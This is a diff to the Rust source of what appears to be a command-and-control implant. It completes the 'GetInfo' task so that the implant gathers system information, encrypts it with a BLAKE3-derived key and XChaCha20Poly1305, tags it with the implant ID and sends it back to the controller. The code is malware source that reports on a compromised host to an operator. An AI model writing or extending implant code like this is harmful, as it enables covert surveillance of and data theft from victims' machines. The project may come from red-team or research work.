@@ -7,6 +7,7 @@ use std::process;
 use std::str::FromStr;
 use x25519_dalek::{PublicKey, StaticSecret};
 
+use crate::http::result;
 use crate::models::task;
 use crate::tasks::system;
 use crate::utils::network_encryption;
@@ -60,6 +61,7 @@ pub fn handle_available_tasks(
 
     // Check if tasks response is empty array
     if deserialized_tasks.is_empty() {
+        println!("I am in empty tasks");
         return Ok(());
     }
 
@@ -68,11 +70,14 @@ pub fn handle_available_tasks(
         let task_enum = task::Tasks::from_str(task.task.as_str()).unwrap();
         match task_enum {
             task::Tasks::GetInfo => {
-                let system_info =
-                    system::gather_system_info(task.task_id.to_string(), &implant_id)?;
+                let system_info = system::gather_system_info(&implant_id)?;
 
-                // TODO: Encrypt and send system_info
-                let encrypted_response = build_encrypted_response(&blake3_hashed_key, system_info);
+                // Encrypt and send system_info
+                let task_id = task.task_id.to_string();
+                let encrypted_response =
+                    build_encrypted_response(&blake3_hashed_key, system_info, implant_id);
+
+                result::send_task(&task_id, encrypted_response);
             }
             _ => process::exit(1),
         }
@@ -97,7 +102,11 @@ pub fn get_tasks(implant_id: &String) -> Result<String, ImplantError> {
 // so BLAKE3 hash will be same.
 // However, XChaCha20Poly1305 adds random nonce, which guarantees
 // that response will be different.
-pub fn build_encrypted_response<T>(blake3_hashed_key: &blake3::Hash, message: T) -> String
+pub fn build_encrypted_response<T>(
+    blake3_hashed_key: &blake3::Hash,
+    message: T,
+    implant_id: &str,
+) -> String
 where
     T: Sized + serde::Serialize,
 {
@@ -112,7 +121,10 @@ where
     // Base64 encode nonce
     let base64_nonce = base64::encode(nonce);
 
-    let response = format!("{}\n{}", base64_encrypted_message, base64_nonce);
+    let response = format!(
+        "{}\n{}\n{}",
+        base64_encrypted_message, base64_nonce, implant_id
+    );
 
     response
 }
